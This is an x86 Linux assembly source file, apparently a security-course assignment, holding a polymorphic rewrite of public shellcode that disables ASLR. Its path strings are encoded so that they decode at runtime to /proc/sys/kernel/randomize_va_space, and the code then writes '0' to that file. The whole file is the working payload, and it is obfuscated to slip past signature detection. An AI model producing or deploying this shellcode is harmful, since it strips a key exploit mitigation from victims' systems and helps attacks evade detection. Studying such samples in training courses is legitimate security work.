; Author: John Stigerwalt
; SLAE: Assignment #6
; Shellcode: Polymorphic ASLR Disable
; Website: slae.whiteknightlabs.com/wordpress
; Orginal Version: http://shell-storm.org/shellcode/files/shellcode-813.php
; Orginal Shellcode using push dword method 


section .text

global _start

_start:

;xor eax, eax
xor ecx, ecx

;push eax
push ecx

mov esi, 0x20202020        
mov edi, 0x45434150         
;push dword 0x65636170
add edi, esi
push edi

mov edi, 0x533f4156
;push dword 0x735f6176
add edi, esi
push edi

mov edi, 0x3f455a49
;push dword 0x5f657a69
add edi, esi
push edi

mov edi, 0x4d4f444e
;push dword 0x6d6f646e
add edi, esi
push edi

mov edi, 0x41520f4c
;push dword 0x61722f6c
add edi, esi
push edi

mov edi, 0x454e5245
;push dword 0x656e7265
add edi, esi
push edi

mov edi, 0x4b0f5359
;push dword 0x6b2f7379
add edi, esi
push edi

mov edi, 0x530f434f
;push dword 0x732f636f
add edi, esi
push edi

push dword 0x72702f2f


mov ebx, esp                    ; 2nd arg - address of zero-terminated pathname

xchg eax, ecx
mov cx, 0x2bc                   ; 700 = file permission mode 3rd arg
mov al, 0x8                     ; 0x8 = create - create a file
int 0x80

mov ebx, eax                    ; file descriptor returned to eax after calling sys_create
                                ; moved to ebx as 2nd argument
push eax
mov dx, 0x3a30                  ; ":0" = 4th arg, maximun number of bytes to write
push dx
mov ecx, esp                    ; address of the buffer
xor edx, edx
inc edx                         ; 1 byte to write for "0"
mov al, 0x4                     ; 0x4 = write
int 0x80

mov al, 0x6                     ; 0x6 = close, returns 0 to eax on success
int 0x80

inc eax                         ; 0x1 = terminate  
int 0x80
